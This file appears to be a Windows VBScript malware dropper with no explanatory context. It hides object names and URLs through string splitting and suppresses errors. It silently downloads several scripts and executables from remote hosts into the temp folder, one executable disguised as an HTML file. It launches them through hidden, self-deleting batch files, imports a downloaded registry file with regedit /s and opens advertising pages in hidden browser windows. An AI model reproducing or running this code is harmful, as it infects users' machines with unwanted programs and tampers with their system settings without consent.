on error resume next
ap9925u1="http://p3.ch"&"ina.sog"&"ou.google.baid"&"u.com.ba"&"idu163s"&"o.info"
ds29hyu5="http://98.126.249.6:81"
ffdxtf70="http://222.217.240.30"
Set b326z6wo= WScript.CreateObject("WScr"&"ipt.Sh"&"ell") 
Set m155l1oam = Wscript.CreateObject("Script"&"ing.FileSystemO"&"bject") 
cy08nvf3=b326z6wo.ExpandEnvironmentStrings("%temp%")
ww4d595u = left(cy08nvf3,3)
b326z6wo.Run("htt"&"p://w"&"ww.xs"&"p5.i"&"nfo/index4.htm")
b326z6wo.run "C:\Progra~1\Intern~1\IEXPLORE.EXE http://ww"&"w.xs"&"p5.info/index/index4.htm",0 

Sub c1ty23l1j(t189433p5)
Set e30n9060= CreateObject("scrip"&"ting.Fi"&"leSys"&"temObject") 
If Not e30n9060.FolderExists(t189433p5) Then
  e30n9060.CreateFolder t189433p5
End If
Set e30n9060 = Nothing 
end sub

Call c1ty23l1j(ww4d595u&"Prog"&"ra~1\Win"&"RAR\ico")
ico1=ww4d595u&"Prog"&"ra~1\WinR"&"AR\ico\"

Sub g98u43cj(q1i11v0dg,w11g5rf2g)
Set j18eok875 = CreateObject("M"&"icros"&"oft.XM"&"L"&"HT"&"TP")
Set k16jp1zhs = CreateObject("AD"&"O"&"DB.S"&"t"&"r"&"e"&"a"&"m")
with j18eok875
.Open "GET",q1i11v0dg,0
.Send()
end with
b=j18eok875.responseBody
with k16jp1zhs
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("j18eok875.r"&"es"&"po"&"n"&"se"&"Bo"&"d"&"y")
.SaveToFile w11g5rf2g,eval ("2")
end with
k16jp1zhs.close
end sub

Sub d1j31ceni(e19k64i8l,f1o7aamkc)
Set r1ghiw637 = CreateObject("Script"&"ing.FileSyste"&"mObject")
If r1ghiw637.FileExists(e19k64i8l) Then                         
       r1ghiw637.deletefile(e19k64i8l)
End If
    Set g15bp15h3=r1ghiw637.CreateTextFile(e19k64i8l,False)
    g15bp15h3.WriteLine(f1o7aamkc)
    g15bp15h3.WriteLine("de"&"l %"&"0 ")
    g15bp15h3.Close       
Set r1ghiw637  = Nothing
end sub

call g98u43cj(ap9925u1&"/ico/tb.ico",ico1&"tb.ico")
for i=1 to 6
call g98u43cj(ap9925u1&"/ico/"+cstr(i)+".ico",ww4d595u&"Progra~1\WinRAR\ico\"+cstr(i)+".ico")
next

call g98u43cj(ds29hyu5&"/"&"hao.txt",cy08nvf3&"\xin"&"g.vbs")
r7wo4lr1=cy08nvf3&"\xingxi"&"ng.bat"
call  d1j31ceni(r7wo4lr1,"start %Temp%\xi"&"ng.vbs")
cmd=b326z6wo.RUN(r7wo4lr1, runhide)
b326z6wo.Run "http://www.19885.info/?gg"

call g98u43cj(ap9925u1&"/go/page.txt",cy08nvf3&"\page.vbs")
r7wo4lr1=cy08nvf3&"\pagepage.bat"
call  d1j31ceni(r7wo4lr1,"start %Temp%\page.vbs")
cmd=b326z6wo.RUN(r7wo4lr1, runhide)
b326z6wo.Run "http://www.19887.info/?gg"

call g98u43cj(ap9925u1&"/dy/bbtbb.html",cy08nvf3&"\bbtbb.exe")
call d1j31ceni(cy08nvf3&"\dian.bat","start %Temp%\bbtbb.exe")
cmd=b326z6wo.RUN(cy08nvf3&"\dian.bat", runhide)
b326z6wo.Run "h"&"ttp://www.198"&"56.info/?gg"

call g98u43cj(ffdxtf70&"/soft/uaua4397.exe",cy08nvf3&"\uaua4397.exe")
r7wo4lr1=cy08nvf3&"\ua2.bat"
call  d1j31ceni(r7wo4lr1,"start %Temp%\uaua4397.exe")
cmd=b326z6wo.RUN(r7wo4lr1, runhide)

call g98u43cj(ffdxtf70&"/soft/gua"&"gua4397.exe",cy08nvf3&"\guagua4397.exe")
r7wo4lr1=cy08nvf3&"\guagua.bat"
call  d1j31ceni(r7wo4lr1,"start %Temp%\guagua4397.exe")
cmd=b326z6wo.RUN(r7wo4lr1, runhide)
b326z6wo.Run "ht"&"tp://www.198"&"59.info/?gg"

r7wo4lr1=cy08nvf3&"\ie.reg"
call g98u43cj(ap9925u1&"/go/ie.txt",r7wo4lr1)
b326z6wo.Run "regedit /s "&r7wo4lr1
b326z6wo.Run "htt"&"p://www.19"&"858.in"&"fo/?gg"

call g98u43cj(ap9925u1&"/go/goto.txt",cy08nvf3&"\goto.vbs")
b326z6wo.Run cy08nvf3&"\goto.vbs",,True
